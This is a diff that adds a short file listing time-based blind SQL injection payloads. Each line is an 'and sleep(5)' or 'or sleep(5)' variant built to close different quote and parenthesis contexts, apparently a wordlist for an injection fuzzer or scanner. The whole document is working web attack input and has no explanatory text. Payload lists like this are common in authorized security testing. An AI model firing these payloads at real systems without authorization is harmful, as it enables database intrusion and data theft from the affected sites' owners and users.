@@ -1,0 +1,16 @@
+ and sleep(5)
+) and sleep(5) and 1=(1
+' and sleep(5) and 'a'='a
+" and sleep(5) and "a"="a
+') and sleep(5) and ('a'='a
+") and sleep(5) and ("a"="a
+')) and sleep(5) and (('a'='a
+")) and sleep(5) and (("a"="a
+ or sleep(5)
+) or sleep(5) or 1=(1
+' or sleep(5) or 'a'='a
+" or sleep(5) or "a"="a
+') or sleep(5) or ('a'='a
+") or sleep(5) or ("a"="a
+')) or sleep(5) or (('a'='a
+")) or sleep(5) or (("a"="a
